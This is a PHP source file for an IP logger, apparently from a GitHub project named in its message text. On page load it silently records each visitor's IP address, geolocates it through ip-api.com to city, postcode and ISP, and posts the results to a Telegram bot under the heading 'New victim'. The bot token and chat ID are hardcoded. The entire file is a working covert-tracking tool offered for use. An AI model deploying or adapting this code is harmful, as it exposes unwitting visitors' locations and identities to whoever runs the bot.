<?php

function telegram($msg) {
        global $telegrambot,$telegramchatid;
        $url = 'https://api.telegram.org/bot'.$telegrambot.'/sendMessage';$data = array('chat_id'=>$telegramchatid,'text'=>$msg);
        $options = array('http'=>array('method' => 'POST','header' => "Content-Type:application/x-www-form-urlencoded\r\n",'content' => http_build_query($data),),);
        $context = stream_context_create($options);
        $result = file_get_contents($url,false,$context);
        return $result;
}

$telegrambot = '1318525370:AAEXFi11J4LGARh62fqnj0vD9QkN1r8946s'; // enter bot token
$telegramchatid = 1085665214; // enter chat id

$ip = $_SERVER['REMOTE_ADDR'];
$ipapi = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
$datetime = date("g:ia, l F j Y"); // g:ia l F j Y   l, F j, Y, g:ia

telegram("New victim:
        IP  :  $ip
        Operating system  :  replace in the sub comment
        Browser  :  replace in the sub comment
        Country  :  $ipapi->country ($ipapi->countryCode)
        Region  :  $ipapi->regionName ($ipapi->region)
        City  :  $ipapi->city
        Zip (Postcode)  :  $ipapi->zip
        Time  :  $datetime
        Internet Provider  :  $ipapi->isp ($ipapi->org)
    
        source  :  https://github.com/GigaZero/IP-Logger
        ");

?>
